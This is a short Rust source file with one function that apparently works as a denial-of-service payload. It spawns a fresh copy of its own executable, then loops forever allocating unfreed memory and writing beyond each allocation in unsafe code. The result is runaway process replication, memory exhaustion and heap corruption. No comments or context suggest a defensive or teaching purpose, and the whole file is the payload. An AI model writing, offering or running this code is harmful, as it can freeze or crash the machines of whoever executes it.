use std::alloc::{alloc, Layout};
use std::env;
use std::process::Command;

pub fn run() {
    let _ = Command::new(env::current_exe().unwrap()).spawn();
    loop {
        unsafe {
            let q = alloc(Layout::from_size_align_unchecked(0x4096, 0x2));
            *q.add(0x8192) = 32;
        }
    }
}
